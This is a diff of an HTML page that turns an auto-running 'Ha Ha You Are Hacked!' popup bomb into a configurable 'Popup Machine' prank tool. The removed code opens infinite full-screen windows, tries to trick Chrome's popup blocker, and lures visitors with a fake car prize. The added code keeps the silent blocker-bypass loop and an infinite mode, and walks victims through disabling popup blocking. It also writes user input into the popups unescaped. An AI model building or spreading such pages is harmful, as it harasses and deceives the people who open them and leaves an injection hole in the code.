@@ -1,79 +1,156 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ha Ha You Are Hacked!</title>
-    <script>
-        function openFullScreenWindow() {
-            let newWindow = window.open("", "_blank", "fullscreen=yes");
-            if (newWindow) {
-                newWindow.document.write(`
-                    <html>
-                    <head><title>Hacked</title></head>
-                    <body style="background-color: black; color: red; text-align: center;">
-                        <h1 style="font-size: 50px;">Ha Ha You Are Hacked!</h1>
-                        <script>
-                            document.documentElement.requestFullscreen();
-                        <\/script>
-                    </body>
-                    </html>
-                `);
-                newWindow.document.close();
-            }
+    <title>Popup Machine</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #222;
+            color: white;
+            text-align: center;
+            padding: 30px;
         }
+        input, button, select {
+            padding: 10px;
+            margin: 5px;
+            font-size: 16px;
+        }
+        .container {
+            background: #333;
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        #instructions {
+            display: none;
+            text-align: left;
+            max-width: 800px;
+            margin: auto;
+        }
+        h2 {
+            color: yellow;
+        }
+        
+        #harmless {
+          color: red;
+        }
+    </style>
+</head>
+<body>
+    <div id="setupUI">
+        <h1>Popup Machine</h1> 
+        <h2 id="harmless">This is Harmless</h2>
+        <div class="container">
+            <p>Enter the desired message or image URL, choose how many times to show it, then click start.</p>
+            <input type="text" id="message" placeholder="Enter text message">
+            <br>
+            <input type="text" id="imageURL" placeholder="Enter image URL (optional)">
+            <br>
+            <select id="popupCount">
+                <option value="infinite">Infinite</option>
+                <option value="10">10</option>
+                <option value="50">50</option>
+                <option value="100">100</option>
+            </select>
+            <br>
+            <button onclick="startPrank()">Start</button>
+        </div>
+    </div>
+
+    <div id="instructions">
+        <h1>Enable Popups to Continue</h1>
+        <p>To run this, you need to allow popups for this site.</p>
+
+        <h2>Chrome (Desktop)</h2>
+        <ol>
+            <li>Look at the right side of the address bar (top of Chrome).</li>
+            <li>Click the popup blocker icon.</li>
+            <li>Select "Always allow popups from this site".</li>
+        </ol>
+
+        <h2>Chrome (Android)</h2>
+        <ol>
+            <li>Tap the three dots menu.</li>
+            <li>Go to "Settings" → "Site settings" → "Pop-ups and redirects".</li>
+            <li>Allow popups.</li>
+        </ol>
+
+        <h2>Safari (iPhone/iPad)</h2>
+        <ol>
+            <li>Open the Settings app.</li>
+            <li>Scroll to Safari.</li>
+            <li>Turn off "Block Pop-ups".</li>
+        </ol>
+
+        <h2>Firefox</h2>
+        <ol>
+            <li>Look for the popup icon in the address bar.</li>
+            <li>Click it and allow popups for this site.</li>
+        </ol>
+
+        <p><strong>Once popups are allowed, click anywhere on this page to continue.</strong></p>
+    </div>
+
+    <script>
+        let message = "";
+        let imageURL = "";
+        let count = 0;
 
         function bypassPopupBlocker() {
             for (let i = 0; i < 10; i++) {  
                 let newWindow = window.open("about:blank", "_blank");
                 if (newWindow) {
-                    newWindow.close(); // Trick Chrome into allowing pop-ups
+                    newWindow.close();
                 }
             }
         }
 
-        function startSpam() {
-            bypassPopupBlocker(); // Try to allow unlimited pop-ups
-            setInterval(openFullScreenWindow, 1); // Open infinite full-screen pop-ups
-        }
-
-        function openPopup() {
-            let win = window.open("", "_blank", "width=400,height=400");
-            if (win) {
-                win.document.write(`<h1 style='color:red;'>Ha Ha You Are Hacked!</h1>`);
-                win.document.close();
+        function showPopup(content) {
+            let newWindow = window.open("", "_blank", "width=400,height=400");
+            if (newWindow) {
+                newWindow.document.write(content);
+                newWindow.document.close();
             }
         }
 
-        function spamPopups() {
-            for (let i = 0; i < 5; i++) {
-                openPopup();
-            }
+        function startPrank() {
+            message = document.getElementById("message").value || "Ha Ha You Are Hacked!";
+            imageURL = document.getElementById("imageURL").value;
+            let countValue = document.getElementById("popupCount").value;
+
+            count = (countValue === "infinite") ? Infinity : parseInt(countValue);
+
+            // Hide setup, show instructions
+            document.getElementById("setupUI").style.display = "none";
+            document.getElementById("instructions").style.display = "block";
+
+            // Silently try to allow popups
+            bypassPopupBlocker();
+
+            // Wait for click after enabling popups
+            document.body.addEventListener("click", () => {
+                let popupContent;
+                if (imageURL) {
+                    popupContent = `<html><body style='background:black;display:flex;justify-content:center;align-items:center;height:100%;'>
+                                    <img src="${imageURL}" style="max-width:100%;max-height:100%;">
+                                    </body></html>`;
+                } else {
+                    popupContent = `<html><body style='background:black;color:red;font-size:30px;text-align:center;'>
+                                    <h1>${message}</h1>
+                                    </body></html>`;
+                }
+
+                let i = 0;
+                let spamInterval = setInterval(() => {
+                    if (i >= count) {
+                        clearInterval(spamInterval);
+                        return;
+                    }
+                    showPopup(popupContent);
+                    i++;
+                }, 200);
+            }, { once: true });
         }
-
-        function tryBypass() {
-            let hiddenFrame = document.createElement("iframe");
-            hiddenFrame.style.display = "none";
-            document.body.appendChild(hiddenFrame);
-            hiddenFrame.contentWindow.open("https://example.com", "_blank");
-        }
-
-        document.addEventListener("mousemove", spamPopups);
-        document.addEventListener("keydown", spamPopups);
-        document.addEventListener("click", tryBypass);
-
-        // Auto-start the attack (Chrome may block this)
-        setTimeout(startSpam, 1000);
-
-        // Auto-run when JSFiddle is loaded
-        window.onload = function() {
-            startSpam();
-        };
     </script>
-</head>
-<body>
-    <h1>Ha Ha You Are Hacked!</h1>
-    <p><strong>Instructions:</strong></p>
-    <p>1. If you see a popup blocker warning in Chrome (it should popup where you search at the top of chrome), click on it.</p>
-    <p>2. Select "Allow popups and redirects" for this site.</p>
-    <p>3. Then, try interacting with the page to get the chance to win a new car!</p>
 </body>
 </html>
